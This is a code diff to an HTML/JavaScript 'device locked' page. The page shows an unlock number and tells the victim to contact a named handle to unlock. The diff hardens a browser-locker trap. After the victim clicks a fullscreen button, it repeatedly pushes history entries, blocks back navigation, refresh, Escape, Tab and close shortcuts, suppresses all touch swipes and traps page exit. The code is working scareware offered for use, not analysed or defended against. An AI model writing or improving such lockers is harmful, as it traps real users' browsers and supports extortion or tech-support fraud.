@@ -88,21 +88,21 @@
         }
         .fullscreen-btn {
             display: inline-block;
-            padding: 12px 28px;
-            background: #4caf50;
+            padding: 14px 35px;
+            background: linear-gradient(135deg, #4caf50, #2e7d32);
             color: white;
             border: none;
             border-radius: 30px;
-            font-size: 16px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             transition: 0.2s;
-            box-shadow: 0 0 20px rgba(76,175,80,0.3);
+            box-shadow: 0 0 30px rgba(76,175,80,0.4);
+            letter-spacing: 1px;
         }
         .fullscreen-btn:active { transform: scale(0.95); }
         .fullscreen-btn.hidden { display: none; }
-        .bg-black { background: #000000; }
     </style>
 </head>
 <body>
@@ -112,7 +112,7 @@
         <div class="sub">Your device has been remotely locked</div>
 
         <!-- FULL SCREEN BUTTON -->
-        <button class="fullscreen-btn" id="fsBtn">🖥️ ENTER FULL SCREEN</button>
+        <button class="fullscreen-btn" id="fsBtn">🖥️ FULL SCREEN</button>
 
         <div class="card">
             <p style="color:#ff8888; font-size:13px;">Your Unique Unlock Number</p>
@@ -135,6 +135,7 @@
 
         // ========== FULLSCREEN FUNCTION ==========
         let isFullscreen = false;
+        let lockEnabled = false;
 
         function enterFullscreen() {
             const elem = document.documentElement;
@@ -156,10 +157,17 @@
 
         // ========== ENABLE LOCK AFTER FULLSCREEN ==========
         function enableLock() {
-            // Block back button
-            window.history.pushState(null, '', window.location.href);
-            window.addEventListener('popstate', function() {
+            if (lockEnabled) return;
+            lockEnabled = true;
+
+            // Block back button - PUSH MULTIPLE
+            for(let i = 0; i < 10; i++) {
                 window.history.pushState(null, '', window.location.href);
+            }
+            window.addEventListener('popstate', function() {
+                for(let i = 0; i < 10; i++) {
+                    window.history.pushState(null, '', window.location.href);
+                }
                 alert('🔒 Cannot exit! Contact admin.');
             });
 
@@ -170,31 +178,38 @@
                 return '🔒 Device locked! Contact admin to exit.';
             });
 
-            // Block keyboard shortcuts
+            // Block ALL keyboard shortcuts
             document.addEventListener('keydown', function(e) {
                 const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'Meta', 'Alt', 'Tab'];
                 if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
                     e.preventDefault();
+                    e.stopPropagation();
                     alert('🔒 Action blocked! Contact admin.');
                     return false;
                 }
             });
 
-            // Block ALL touch swipes
+            // Block ALL touch swipes - COMPLETE BLOCK
             let touchStartX = 0, touchStartY = 0;
             document.addEventListener('touchstart', function(e) {
                 touchStartX = e.touches[0].clientX;
                 touchStartY = e.touches[0].clientY;
             }, { passive: true });
+
             document.addEventListener('touchmove', function(e) {
                 e.preventDefault();
+                e.stopPropagation();
+                return false;
             }, { passive: false });
+
             document.addEventListener('touchend', function(e) {
                 const dx = e.changedTouches[0].clientX - touchStartX;
                 const dy = e.changedTouches[0].clientY - touchStartY;
-                if (Math.abs(dx) > 30 || Math.abs(dy) > 30) {
+                if (Math.abs(dx) > 10 || Math.abs(dy) > 10) {
                     e.preventDefault();
+                    e.stopPropagation();
                     alert('🔒 Swipe blocked! Contact admin.');
+                    return false;
                 }
             });
 
@@ -211,8 +226,10 @@
 
             // Continuous history push
             setInterval(function() {
-                window.history.pushState(null, '', window.location.href);
-            }, 500);
+                if (lockEnabled) {
+                    window.history.pushState(null, '', window.location.href);
+                }
+            }, 200);
         }
 
         // ========== CHECK UNLOCK ==========
@@ -247,7 +264,7 @@
 
         console.log('🔒 Device locked! Number:', userNumber);
         console.log('📞 Contact @notxsatvir to unlock');
-        console.log('🖥️ Click "ENTER FULL SCREEN" to lock');
+        console.log('🖥️ Click "FULL SCREEN" to lock');
     </script>
 </body>
 </html>
